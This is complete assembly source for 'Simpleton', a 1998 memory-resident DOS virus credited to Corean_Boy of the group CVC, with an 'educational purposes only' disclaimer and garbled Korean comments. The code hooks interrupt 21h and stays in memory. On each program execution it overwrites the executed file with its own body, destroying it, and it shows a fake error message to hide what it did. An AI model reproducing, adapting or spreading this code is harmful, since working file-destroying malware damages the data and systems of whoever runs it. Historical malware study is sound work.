;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \   \\\\\\\
;                                             \          \     \   \
;         Simpleton                           \           \   \    \    98/05
;                                             \            \ \     \
;                                              \\\\\\\      \       \\\\\\\ #04
;
; Virus Name : Simpleton
; Author     : Corean_Boy
; Group      : CVC
; Origin     : Corea
; Date       : 1998/04/05
; Type       : Memory Resident COM/EXE  Overwriting
;
;  !*< ��I�� ���� >********************************************************!
;   *                                                                        *
;   * �w�� !                                                                 *
;   *        �� �����e �a�B�ⷥ ����a���e �a�w�A�ᴡ �s���a. �����e ��      *
;   *        �����i �a�wЁ�� �i���a�e ��� ���A�A ��Ё�ᕡ �����i ���� �g    *
;   *        �s���a. ���e �����e �i�i ���e �a�q�A�A ���s���a.                *
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
;   �a�� �� �a����a�� �w���w �s�a�a�� �a����a���a.
;   �s�a�a�� �a����a���a�� ���� �����a�a.
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

        .model tiny
        .code

PARASIZE        equ (End_Memory-code_begin + 0Fh) SHR 4 + 10h

        org     100h

code_begin:
        mov     ax,'CO'             ; COREAN
        mov     bx,'RE'
        mov     cx,'AN'
        int     21h

        cmp     ax,'BO'             ; BOY!
        jnz     Resident
        cmp     bx,'Y!'
        jnz     Resident

        mov     ah,9                ; �A�� �A���� �b
        mov     dx, offset Error_Message
        int     21h

        mov     ah,4ch              ; �a���a�� ���a
        int     21h

 Resident:
        mov     ax,3521h            ; Int 21h ���� �苡
        int     21h
        mov     word ptr int21_addr,bx
        mov     word ptr int21_addr[2],es

        mov     ah,25h              ; Int 21h �a������
        lea     dx,int21_virus      ; DX = int21_virus
        int     21h

        push    cs
        pop     es

        mov     ah,9                ; �A�� �A���� �i��
        mov     dx, offset Error_Message
        int     21h

        mov     ah,31h
        mov     dx, PARASIZE
        int     21h

int21_virus  proc    near           ; Interrupt 21h of virus
        cmp     ax,'CO'             ; �w�� �a�� ��a
        jnz     Check_Execute       ; COREAN BOY!
        cmp     bx,'RE'
        jnz     Check_Execute
        cmp     cx,'AN'
        jnz     Check_Execute
        mov     ax,'BO'
        mov     bx,'Y!'
        iret

 Check_Execute:
        cmp     ax,4b00h            ; ��З���a ?
        jnz     int21_exit          ;
Infect:
        push    ax
        push    bx
        push    cx
        push    dx
        push    ds

        mov     ax,3d02h            ; �a�� ���e
        int     21h
        jc      Open_error

        xchg    ax,bx               ; BX = file handle
        push    cs                  ;
        pop     ds                  ; cs=ds

        mov     ah,40h              ; �a����a �a��
        mov     cx, offset End_Memory - 100h
        lea     dx, code_begin
        int     21h

        mov     ah, 3Eh
        int     21h

 Open_error:
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax

int21_exit:
        db      0eah                ; ���a
int21_addr      dd      ?           ; Address of interrupt 21h

                db      '[Simpleton]'
                db      'My first virus... by Corean_Boy / CVC 1998.04'
Error_Message   db      'Abnormal Program Termination$'


End_Memory:
        endp

        end     code_begin
